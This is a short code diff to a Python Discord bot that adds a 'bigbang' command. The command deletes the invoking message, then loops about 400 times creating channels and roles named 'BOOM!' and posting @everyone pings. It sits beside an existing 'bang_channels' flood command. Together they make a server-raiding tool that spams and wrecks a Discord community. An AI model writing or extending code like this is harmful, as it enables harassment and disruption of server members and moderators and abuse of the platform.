@@ -35,4 +35,15 @@ async def bang_channels(ctx, arg=10):
         bangs += 1
 bangs = 0
 
+@bot.command()
+async def bigbang(ctx):
+    await ctx.message.delete()
+    bigbangs = 0
+    while 400 >= bigbangs:
+        await guild.create_text_channel(name="BOOM!")
+        await ctx.send("@everyone")
+        await guild.create_role(name="BOOM!")
+        bigbangs += 1
+    bigbangs = 0
+
 bot.run(token)
